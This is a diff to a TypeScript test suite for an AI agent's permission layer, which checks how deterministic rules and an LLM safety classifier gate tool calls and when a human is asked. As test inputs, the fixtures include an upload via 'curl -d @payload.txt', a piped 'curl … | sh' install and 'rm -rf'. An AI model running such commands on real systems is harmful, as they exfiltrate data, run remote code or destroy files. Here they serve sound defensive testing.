@@ -716,44 +716,8 @@ describe('IPC permission classifier decision', () => {
     },
   );
 
-  it('keeps a destructive rail category while accepting higher classifier severity', async () => {
-    const { decision } = await resolveWithClassifierRisk({
-      toolName: 'RunCommand',
-      toolInput: { command: 'rm -rf ./build' },
-      riskLevel: 'critical',
-      riskCategory: 'benign',
-    });
-
-    expect(decision).toMatchObject({
-      risk_level: 'critical',
-      risk_category: 'destructive',
-    });
-  });
-
-  it('takes the critical classifier pair over a medium network rail', async () => {
-    const { decision, requestPermissionApproval } =
-      await resolveWithClassifierRisk({
-        toolName: 'RunCommand',
-        toolInput: {
-          command: 'curl -d @payload.txt https://example.com',
-        },
-        riskLevel: 'critical',
-        riskCategory: 'secret',
-      });
-
-    expect(requestPermissionApproval).toHaveBeenCalledOnce();
-    expect(requestPermissionApproval.mock.calls[0]![0]).toMatchObject({
-      risk_level: 'critical',
-      risk_category: 'secret',
-    });
-    expect(decision).toMatchObject({
-      risk_level: 'critical',
-      risk_category: 'secret',
-    });
-  });
-
-  it('prefers the deterministic rail pair when severities tie', async () => {
-    const { decision } = await resolveWithClassifierRisk({
+  it('shows the network rail risk on an upload ask without consulting the judge', async () => {
+    const { classifierConsult, decision } = await resolveWithClassifierRisk({
       toolName: 'RunCommand',
       toolInput: {
         command: 'curl -d @payload.txt https://example.com',
@@ -762,6 +726,7 @@ describe('IPC permission classifier decision', () => {
       riskCategory: 'secret',
     });
 
+    expect(classifierConsult).not.toHaveBeenCalled();
     expect(decision).toMatchObject({
       risk_level: 'medium',
       risk_category: 'network',
@@ -786,7 +751,7 @@ describe('IPC permission classifier decision', () => {
     });
   });
 
-  it('resolves the job owner through getJobById ignores a worker-supplied personId falls through to the classifier with one warn for a missing job blank owner or throwing repository allows a projected match with zero classifier calls honours a classifier allow on a job with auto_classifier provenance routes a classifier ask to the existing card path never authorizes through a live or cached classifier Allow when hardFloor is set with any typed signal applies the interactive cache and cache-write rules to jobs and denies an absent route with sanitised risk and zero repository calls', async () => {
+  it('resolves the job owner through getJobById ignores a worker-supplied personId falls through to the classifier with one warn for a missing job blank owner or throwing repository allows a projected match with zero classifier calls honours a classifier allow on a job with auto_classifier provenance routes a classifier ask to the existing card path lets a live classifier Allow stand over an out-of-root or read-only find ask without reading the cache applies the interactive cache and cache-write rules to jobs and denies an absent route with sanitised risk and zero repository calls', async () => {
     const warn = vi.spyOn(logger, 'warn').mockImplementation(() => undefined);
     let sequence = 0;
     const runJob = async (options: {
@@ -1042,29 +1007,19 @@ describe('IPC permission classifier decision', () => {
         const live = await runJob({
           toolName: 'RunCommand',
           classifierRisk: 'low',
-          ...railCase,
-        });
-        expect(live.classifierConsult).toHaveBeenCalledOnce();
-        expect(live.requestPermissionApproval).toHaveBeenCalledOnce();
-        expect(live.decision).not.toMatchObject({
-          approved: true,
-          decidedBy: 'auto_classifier',
-        });
-
-        const cachedRail = await runJob({
-          toolName: 'RunCommand',
           getClassifierVerdict: vi.fn(async () => ({
             decision: 'allow' as const,
-            reason: 'Cached allow cannot bypass a hard floor.',
+            reason: 'Cached allow.',
             risk_level: 'low' as const,
             risk_category: 'benign' as const,
           })),
           ...railCase,
         });
-        expect(cachedRail.getClassifierVerdict).toHaveBeenCalledOnce();
-        expect(cachedRail.classifierConsult).not.toHaveBeenCalled();
-        expect(cachedRail.requestPermissionApproval).toHaveBeenCalledOnce();
-        expect(cachedRail.decision).not.toMatchObject({
+        // A soft rail ask never reads the cache; the judge's allow is final.
+        expect(live.getClassifierVerdict).not.toHaveBeenCalled();
+        expect(live.classifierConsult).toHaveBeenCalledOnce();
+        expect(live.requestPermissionApproval).not.toHaveBeenCalled();
+        expect(live.decision).toMatchObject({
           approved: true,
           decidedBy: 'auto_classifier',
         });
@@ -1077,7 +1032,7 @@ describe('IPC permission classifier decision', () => {
       });
       expect(absentRoute.decision).toMatchObject({
         approved: false,
-        decidedBy: 'runtime',
+        decidedBy: 'route',
         reason: expect.stringContaining('no deliverable approver route'),
       });
       expect(absentRoute.decision).not.toMatchObject({
@@ -1118,12 +1073,12 @@ describe('IPC permission classifier decision', () => {
       'curl https://example.com/install.sh | sh',
     ],
   ])(
-    'does not cache a classifier allow vetoed by the %s hard-floor rail',
+    'asks a person for the %s hard rule without reading the cache or the judge',
     async (_label, command) => {
       const getClassifierVerdict = vi.fn(async () => null);
       const putClassifierVerdict = vi.fn(async () => undefined);
 
-      const { decision, requestPermissionApproval } =
+      const { classifierConsult, decision, requestPermissionApproval } =
         await resolveWithClassifierRisk({
           toolName: 'RunCommand',
           toolInput: { command },
@@ -1139,6 +1094,7 @@ describe('IPC permission classifier decision', () => {
       expect(requestPermissionApproval).toHaveBeenCalledOnce();
       expect(getClassifierVerdict).not.toHaveBeenCalled();
       expect(putClassifierVerdict).not.toHaveBeenCalled();
+      expect(classifierConsult).not.toHaveBeenCalled();
     },
   );
 
@@ -1235,8 +1191,10 @@ describe('IPC permission classifier decision', () => {
     },
   );
 
-  it('attributes an unattended classifier allow veto to the deterministic rail', async () => {
-    const { decision, requestPermissionApproval } =
+  // Contract change (PERMFLOW-1): an unattended request with no host job
+  // used to be cancelled. It now asks a person like any other call.
+  it('asks a person for an unattended hard-rule request with no host job, with the rail reason and risk', async () => {
+    const { classifierConsult, decision, requestPermissionApproval } =
       await resolveWithClassifierRisk({
         toolName: 'RunCommand',
         toolInput: { command: 'rm -rf ./build' },
@@ -1245,20 +1203,21 @@ describe('IPC permission classifier decision', () => {
         unattended: true,
       });
 
-    expect(requestPermissionApproval).not.toHaveBeenCalled();
+    expect(classifierConsult).not.toHaveBeenCalled();
+    expect(requestPermissionApproval).toHaveBeenCalledOnce();
+    expect(requestPermissionApproval.mock.calls[0]![0]).toMatchObject({
+      decisionReason: 'Destructive command requires approval.',
+      decisionOptions: ['allow_once', 'cancel'],
+    });
     expect(decision).toMatchObject({
       approved: false,
-      decidedBy: 'deterministic_rails',
-      reason: 'Destructive command requires approval.',
+      decidedBy: 'owner',
       risk_level: 'high',
       risk_category: 'destructive',
     });
-    expect(decision.reason).not.toContain(
-      'Classifier requested human approval',
-    );
   });
 
-  it('keeps the classifier reason for a genuine unattended classifier ASK', async () => {
+  it('asks a person with the judge reason for an unattended request the judge asks about', async () => {
     const { decision, requestPermissionApproval } =
       await resolveWithClassifierRisk({
         toolName: 'mcp__crm__update_record',
@@ -1268,12 +1227,13 @@ describe('IPC permission classifier decision', () => {
         unattended: true,
       });
 
-    expect(requestPermissionApproval).not.toHaveBeenCalled();
+    expect(requestPermissionApproval).toHaveBeenCalledOnce();
+    expect(requestPermissionApproval.mock.calls[0]![0]).toMatchObject({
+      decisionReason: 'Classifier risk assessment.',
+    });
     expect(decision).toMatchObject({
       approved: false,
-      decidedBy: 'runtime',
-      reason:
-        'Classifier requested human approval: Classifier risk assessment.',
+      decidedBy: 'owner',
       risk_level: 'high',
       risk_category: 'network',
     });
@@ -1299,13 +1259,14 @@ describe('IPC permission classifier decision', () => {
         } as never,
       });
 
+    // A hard-rule ask reads neither the cache nor the judge.
     expect(getClassifierVerdict).not.toHaveBeenCalled();
-    expect(classifierConsult).toHaveBeenCalledOnce();
+    expect(classifierConsult).not.toHaveBeenCalled();
     expect(requestPermissionApproval).toHaveBeenCalledOnce();
     expect(decision).toMatchObject({ approved: false, decidedBy: 'owner' });
   });
 
-  it('passes a cached classifier allow through the relaxable rail merge without consulting again', async () => {
+  it('never reads the verdict cache for an out-of-root ask; the live judge decides it', async () => {
     const getClassifierVerdict = vi.fn(async () => ({
       decision: 'allow' as const,
       reason: 'cached read allow',
@@ -1320,21 +1281,16 @@ describe('IPC permission classifier decision', () => {
         riskLevel: 'high',
         riskCategory: 'filesystem',
         trustedRoots: [],
-        decisionMemory: { getClassifierVerdict } as never,
+        decisionMemory: {
+          getClassifierVerdict,
+          putClassifierVerdict: vi.fn(async () => undefined),
+        } as never,
       });
 
-    expect(getClassifierVerdict).toHaveBeenCalledOnce();
-    expect(classifierConsult).not.toHaveBeenCalled();
-    expect(requestPermissionApproval).not.toHaveBeenCalled();
-    expect(decision).toMatchObject({
-      approved: true,
-      decidedBy: 'auto_classifier',
-      source: 'auto_classifier',
-      railProvenance: {
-        signal: 'out_of_trusted_root',
-        reason: expect.stringContaining('outside'),
-      },
-    });
+    expect(getClassifierVerdict).not.toHaveBeenCalled();
+    expect(classifierConsult).toHaveBeenCalledOnce();
+    expect(requestPermissionApproval).toHaveBeenCalledOnce();
+    expect(decision).toMatchObject({ approved: false, decidedBy: 'owner' });
   });
 
   it('does not reuse a cached classifier allow after switching to ask mode', async () => {
@@ -1429,156 +1385,19 @@ describe('IPC permission classifier decision', () => {
     expect(putClassifierVerdict).not.toHaveBeenCalled();
   });
 
-  it('sends the offline notice to the job conversation before the terminal job decision with the offline reason', async () => {
+  // Contract change (PERMFLOW-1): a judge outage used to post a chat notice
+  // before the first card, and a job ended without asking. Now the outage is
+  // a log line and the prompt's reason, for chat and jobs alike.
+  it('asks with the offline reason line and sends no chat message while the judge is offline, for chat, a job and a denylist ask', async () => {
     judgeOutageLatch.clearAll();
-    const responseKeyId = 'outage-job';
-    const timeline: string[] = [];
-    registerWorkerPermissionRunRestriction({
-      sourceAgentFolder: 'main_agent',
-      responseKeyId,
-      hideAuthorityTools: false,
-      runKind: 'scheduled',
-      jobId: 'job-outage',
-      runId: 'run-outage',
-    });
-    try {
-      const decision = await resolvePermissionIpcDecision({
-        request: {
-          requestId: 'job-outage-request',
-          responseKeyId,
-          sourceAgentFolder: 'main_agent',
-          targetJid: 'tg:job-outage',
-          toolName: 'mcp__crm__update_record',
-          toolInput: { id: 'job-outage' },
-        },
-        sourceAgentFolder: 'main_agent',
-        deps: {
-          opsRepository: {
-            getJobById: vi.fn(async () => ({
-              id: 'job-outage',
-              execution_context: { personId: null },
-            })),
-          },
-          conversationRoutes: () =>
-            ({
-              'tg:job-outage': {
-                name: 'job outage',
-                folder: 'main_agent',
-                trigger: '@gantry',
-                added_at: '2026-09-10',
-                agentConfig: { permissionMode: 'auto' },
-              },
-            }) as never,
-          sendMessage: vi.fn(async () => {
-            timeline.push('notice');
-          }),
-          requestPermissionApproval: vi.fn(async (request) => {
-            timeline.push(`terminal:${request.decisionReason}`);
-            return permissionDecisionResult({
-              approved: false,
-              mode: 'cancel',
-              decidedBy: 'owner',
-            });
-          }),
-          classifierConsult: vi.fn(async () => ({
-            status: PermissionClassifierStatus.Unavailable,
-            risk_level: 'high' as const,
-            risk_category: 'network' as const,
-            reason: 'Offline.',
-            latencyMs: 1,
-            failureCode: 'query_error' as const,
-          })),
-          publishRuntimeEvent: vi.fn(async () => undefined),
-          getPermissionRuntimeSettings: () => ({
-            agents: { main_agent: { permissionMode: 'auto' as const } },
-            permissions: { autoMode: {}, trustedRoots: [] },
-            memory: { llm: { models: { extractor: 'sonnet' } } },
-          }),
-        } as never,
-      });
-      expect(timeline).toEqual([
-        'notice',
-        'terminal:Asking because my safety judge is offline.',
-      ]);
-      expect(decision).toMatchObject({ approved: false, decidedBy: 'owner' });
-    } finally {
-      unregisterPermissionRunRestriction({
-        sourceAgentFolder: 'main_agent',
-        responseKeyId,
-      });
-      judgeOutageLatch.clearAll();
-    }
-  });
-
-  it('sends the offline notice before the denylist-forced card too', async () => {
-    judgeOutageLatch.clearAll();
-    const timeline: string[] = [];
-    const consult = vi
-      .spyOn(permissionClassifier, 'consultPermissionClassifierBeforePrompt')
-      .mockResolvedValue({
-        status: PermissionClassifierStatus.Unavailable,
-        risk_level: 'high',
-        reason: 'Offline.',
-        latencyMs: 1,
-        failureCode: 'query_error',
-        decision: 'ask',
-        denylistHit: true,
-      });
-    try {
-      await resolvePermissionIpcDecision({
-        request: {
-          requestId: 'offline-denylist',
-          sourceAgentFolder: 'main_agent',
-          targetJid: 'conversation:denylist',
-          toolName: 'mcp__crm__update_record',
-          toolInput: { id: 'denylist' },
-        },
-        sourceAgentFolder: 'main_agent',
-        deps: {
-          conversationRoutes: () => liveRoutes(),
-          sendMessage: vi.fn(async () => {
-            timeline.push('notice');
-          }),
-          requestPermissionApproval: vi.fn(async (request) => {
-            timeline.push(`card:${request.decisionReason}`);
-            return permissionDecisionResult({
-              approved: false,
-              mode: 'cancel',
-              decidedBy: 'owner',
-            });
-          }),
-          publishRuntimeEvent: vi.fn(async () => undefined),
-          getPermissionRuntimeSettings: () => ({
-            agents: { main_agent: { permissionMode: 'auto' as const } },
-            permissions: { autoMode: {}, trustedRoots: [] },
-            memory: { llm: { models: { extractor: 'sonnet' } } },
-          }),
-        } as never,
-      });
-      expect(timeline).toEqual([
-        'notice',
-        'card:Asking because my safety judge is offline.',
-      ]);
-    } finally {
-      consult.mockRestore();
-      judgeOutageLatch.clearAll();
-    }
-  });
-
-  it('sends one offline notice before the first offline card sets the offline reason line skips the notice on repeat re-notifies after an answered result swallows a send failure and yields wiring_missing when the consult wiring is absent', async () => {
-    judgeOutageLatch.clearAll();
-    const events: string[] = [];
-    const requestPermissionApproval = vi.fn(async (request) => {
-      events.push(`card:${request.decisionReason}`);
-      return permissionDecisionResult({
+    const sendMessage = vi.fn(async () => undefined);
+    const requestPermissionApproval = vi.fn(async () =>
+      permissionDecisionResult({
         approved: false,
         mode: 'cancel',
         decidedBy: 'owner',
-      });
-    });
-    const sendMessage = vi.fn(async () => {
-      events.push('notice');
-    });
+      }),
+    );
     const putClassifierVerdict = vi.fn(async () => undefined);
     let answered = false;
     const classifierConsult = vi.fn(async () => ({
@@ -1591,140 +1410,129 @@ describe('IPC permission classifier decision', () => {
       latencyMs: 1,
       ...(answered ? {} : { failureCode: 'query_error' as const }),
     }));
-    const resolve = (
-      requestId: string,
-      overrides: Record<string, unknown> = {},
-    ) =>
+    const deps = (overrides: Record<string, unknown> = {}) =>
+      ({
+        conversationRoutes: () => liveRoutes(),
+        opsRepository: {
+          getJobById: vi.fn(async () => ({
+            id: 'job-outage',
+            execution_context: { personId: null },
+          })),
+        },
+        sendMessage,
+        requestPermissionApproval,
+        classifierConsult,
+        publishRuntimeEvent: vi.fn(async () => undefined),
+        getPermissionDecisionMemoryRepository: () =>
+          ({
+            getClassifierVerdict: vi.fn(async () => null),
+            putClassifierVerdict,
+          }) as never,
+        getPermissionRuntimeSettings: () => ({
+          agents: { main_agent: { permissionMode: 'auto' as const } },
+          permissions: {
+            autoMode: {},
+            trustedRoots: [resolveWorkspaceFolderPath('main_agent')],
+          },
+          memory: { llm: { models: { extractor: 'sonnet' } } },
+        }),
+        ...overrides,
+      }) as never;
+    const resolve = (requestId: string, overrides = {}, depOverrides = {}) =>
       resolvePermissionIpcDecision({
         request: {
           requestId,
+          targetJid: ROUTED_JID,
           sourceAgentFolder: 'main_agent',
           toolName: 'mcp__crm__update_record',
           toolInput: { id: requestId },
-          targetJid: 'conversation:offline',
-          providerAccountId: 'account-one',
           ...overrides,
         },
         sourceAgentFolder: 'main_agent',
-        deps: {
-          conversationRoutes: () => liveRoutes(),
-          sendMessage,
-          requestPermissionApproval,
-          classifierConsult,
-          publishRuntimeEvent: vi.fn(async () => undefined),
-          getPermissionDecisionMemoryRepository: () =>
-            ({
-              getClassifierVerdict: vi.fn(async () => null),
-              putClassifierVerdict,
-            }) as never,
-          getPermissionRuntimeSettings: () => ({
-            agents: { main_agent: { permissionMode: 'auto' as const } },
-            permissions: {
-              autoMode: {},
-              trustedRoots: [resolveWorkspaceFolderPath('main_agent')],
-            },
-            memory: { llm: { models: { extractor: 'sonnet' } } },
-          }),
-        } as never,
+        deps: deps(depOverrides),
       });
+    const lastCard = () => requestPermissionApproval.mock.calls.at(-1)?.[0];
+    const offline = 'Asking because my safety judge is offline.';
 
     await resolve('offline-one');
     await resolve('offline-two');
-    expect(events).toEqual([
-      'notice',
-      'card:Asking because my safety judge is offline.',
-      'card:Asking because my safety judge is offline.',
-    ]);
+    expect(
+      requestPermissionApproval.mock.calls.map(
+        ([request]) => request.decisionReason,
+      ),
+    ).toEqual([offline, offline]);
     expect(putClassifierVerdict).not.toHaveBeenCalled();
 
     answered = true;
     await resolve('answered');
+    expect(lastCard()).toMatchObject({ decisionReason: 'The judge answered.' });
     answered = false;
-    await resolve('offline-three');
-    expect(sendMessage).toHaveBeenCalledTimes(2);
 
-    const sendFailure = vi.fn(async () => {
-      throw new Error('delivery failed');
-    });
-    await expect(
-      resolvePermissionIpcDecision({
-        request: {
-          requestId: 'offline-send-failure',
-          sourceAgentFolder: 'main_agent',
-          toolName: 'mcp__crm__update_record',
-          toolInput: { id: 'send-failure' },
-          targetJid: 'conversation:send-failure',
-        },
-        sourceAgentFolder: 'main_agent',
-        deps: {
-          conversationRoutes: () => liveRoutes(),
-          sendMessage: sendFailure,
-          requestPermissionApproval,
-          classifierConsult,
-          publishRuntimeEvent: vi.fn(async () => undefined),
-          getPermissionRuntimeSettings: () => ({
-            agents: { main_agent: { permissionMode: 'auto' as const } },
-            permissions: { autoMode: {}, trustedRoots: [] },
-            memory: { llm: { models: { extractor: 'sonnet' } } },
-          }),
-        } as never,
-      }),
-    ).resolves.toMatchObject({ approved: false });
-
-    const classifierMissing = vi.fn();
-    await resolvePermissionIpcDecision({
-      request: {
-        requestId: 'wiring-missing',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'mcp__crm__update_record',
-        toolInput: { id: 'wiring-missing' },
-        targetJid: 'conversation:wiring-missing',
-      },
+    const responseKeyId = 'outage-job';
+    registerWorkerPermissionRunRestriction({
       sourceAgentFolder: 'main_agent',
-      deps: {
-        conversationRoutes: () => liveRoutes(),
-        sendMessage,
-        requestPermissionApproval,
-        classifierConsult: classifierMissing,
-        getPermissionRuntimeSettings: () => ({
-          agents: { main_agent: { permissionMode: 'auto' as const } },
-          permissions: { autoMode: {}, trustedRoots: [] },
-          memory: { llm: { models: { extractor: 'sonnet' } } },
-        }),
-      } as never,
+      responseKeyId,
+      hideAuthorityTools: false,
+      runKind: 'scheduled',
+      jobId: 'job-outage',
+      runId: 'run-outage',
     });
-    expect(classifierMissing).not.toHaveBeenCalled();
-    expect(requestPermissionApproval.mock.calls.at(-1)?.[0]).toMatchObject({
-      decisionReason: 'Asking because my safety judge is offline.',
-    });
+    try {
+      await expect(
+        resolve('job-outage-request', { responseKeyId }),
+      ).resolves.toMatchObject({ approved: false, decidedBy: 'owner' });
+      expect(lastCard()).toMatchObject({ decisionReason: offline });
+    } finally {
+      unregisterPermissionRunRestriction({
+        sourceAgentFolder: 'main_agent',
+        responseKeyId,
+      });
+    }
 
-    const notices = sendMessage.mock.calls.length;
+    const consult = vi
+      .spyOn(permissionClassifier, 'consultPermissionClassifierBeforePrompt')
+      .mockResolvedValueOnce({
+        status: PermissionClassifierStatus.Unavailable,
+        risk_level: 'high',
+        reason: 'Offline.',
+        latencyMs: 1,
+        failureCode: 'query_error',
+        decision: 'ask',
+        denylistHit: true,
+      });
+    try {
+      await resolve('offline-denylist');
+      expect(lastCard()).toMatchObject({
+        decisionReason: offline,
+        decisionOptions: ['allow_once', 'cancel'],
+      });
+    } finally {
+      consult.mockRestore();
+    }
+
+    // No event wiring: the judge can't run, so it reports wiring_missing.
+    const classifierMissing = vi.fn();
+    const wiringMissing = {
+      classifierConsult: classifierMissing,
+      publishRuntimeEvent: undefined,
+    };
+    await resolve('wiring-missing', {}, wiringMissing);
+    expect(classifierMissing).not.toHaveBeenCalled();
+    expect(lastCard()).toMatchObject({ decisionReason: offline });
+
     const cards = requestPermissionApproval.mock.calls.length;
     await expect(
-      resolvePermissionIpcDecision({
-        request: {
-          requestId: 'wiring-missing-local-read',
-          sourceAgentFolder: 'main_agent',
+      resolve(
+        'wiring-missing-local-read',
+        {
           toolName: 'mcp__gantry__file',
           toolInput: { action: 'read', path: 'notes/a.md' },
-          targetJid: 'conversation:wiring-missing-local-read',
         },
-        sourceAgentFolder: 'main_agent',
-        deps: {
-          conversationRoutes: () => liveRoutes(),
-          sendMessage,
-          requestPermissionApproval,
-          classifierConsult: classifierMissing,
-          getPermissionRuntimeSettings: () => ({
-            agents: { main_agent: { permissionMode: 'auto' as const } },
-            permissions: { autoMode: {}, trustedRoots: [] },
-            memory: { llm: { models: { extractor: 'sonnet' } } },
-          }),
-        } as never,
-      }),
+        wiringMissing,
+      ),
     ).resolves.toMatchObject({ approved: true, decidedBy: 'auto_classifier' });
-    expect(sendMessage).toHaveBeenCalledTimes(notices);
     expect(requestPermissionApproval).toHaveBeenCalledTimes(cards);
+    expect(sendMessage).not.toHaveBeenCalled();
     judgeOutageLatch.clearAll();
   });
 
